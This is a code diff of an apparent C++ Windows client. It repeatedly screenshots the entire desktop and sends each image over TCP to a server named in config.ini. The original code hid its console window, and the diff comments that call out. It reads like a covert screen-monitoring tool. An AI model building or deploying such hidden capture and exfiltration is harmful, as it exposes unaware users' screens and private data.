@@ -5,6 +5,7 @@
 #include <iostream>
 #include <fstream>
 #include <istream>
+#include <memory>
 #include <SFML\Network.hpp>
 #include <SFML\Graphics.hpp>
 #include <SFML\System.hpp>
@@ -48,7 +49,7 @@ void ScreenShot(const std::wstring& name)
   HWND desktopHwnd = GetDesktopWindow();
   RECT desktopParams;
   HDC devC = GetDC(desktopHwnd);
-  if (!GetWindowRect(desktopHwnd, &desktopParams))
+  if (GetWindowRect(desktopHwnd, &desktopParams) == FALSE)
   {
     printf("Error: cannot get window rect");
   }
@@ -58,14 +59,16 @@ void ScreenShot(const std::wstring& name)
   HBITMAP captureBitmap = CreateCompatibleBitmap(devC, width, height);
   SelectObject(captureDC, captureBitmap);
   BitBlt(captureDC, 0, 0, width, height, devC, 0, 0, SRCCOPY | CAPTUREBLT);
-  Bitmap *p_bmp = Bitmap::FromHBITMAP(captureBitmap, NULL);
+  std::unique_ptr<Bitmap> p_bmp(Bitmap::FromHBITMAP(captureBitmap, NULL));
   CLSID encoderClsid;
-  GetEncoderClsid(L"image/png", &encoderClsid);
-  if (p_bmp->Save(L"Image.png", &encoderClsid, NULL) != Gdiplus::Status::Ok)
+  if (-1 == GetEncoderClsid(L"image/png", &encoderClsid))
+    {
+    printf("Error: cannot get png encoder");
+    }
+  if (p_bmp->Save(name.c_str(), &encoderClsid, NULL) != Gdiplus::Status::Ok)
   {
     printf("Error: gdiplus save png image status != Ok");
   }
-  delete p_bmp;
 }
 
 
@@ -77,7 +80,7 @@ int main()
   {
     printf("Error: gdiplus startup status != Ok");
   }
-  FreeConsole();
+  //FreeConsole();
   IniParser inip(L".\\config.ini");
   std::wstring serverip;
   if (!inip.GetValue(serverip, L"serverip"))
@@ -106,25 +109,31 @@ int main()
     printf("Error at temp path: length = 0");
     return -1;
   }
-  std::wstring name = std::wstring(tempPath) + L"\\image.png";
+  std::wstring name = std::wstring(tempPath) + L"image.png";
   std::string ip(serverip.begin(), serverip.end());
-  sf::TcpSocket socket;
-  sf::Socket::Status st = socket.connect(ip, port);
-  if (st != sf::Socket::Status::Done)
-  {
-    printf("Error: cannot connect to the server");
-    return -1;
-  }
+  
   while (true)
   {
     ScreenShot(name);
-    sf::Packet packet;
+
     std::ifstream inputStream(name, std::ios::binary);
     if (inputStream.is_open())
     {
       std::string str((std::istreambuf_iterator<char>(inputStream)), std::istreambuf_iterator<char>());
+
+      sf::TcpSocket socket;
+      sf::Socket::Status st = socket.connect(ip, port);
+      if (st != sf::Socket::Status::Done)
+        {
+        printf("Error: cannot connect to the server");
+        continue;
+        }
+      sf::Packet packet;
       packet.append(&str[0], str.size());
       sf::Socket::Status status = socket.send(packet);
+      while (status == sf::Socket::Status::Partial)
+        status = socket.send(packet);
+
       if (status != sf::Socket::Status::Done)
       {
         printf("Error: cannot send packet to the server");
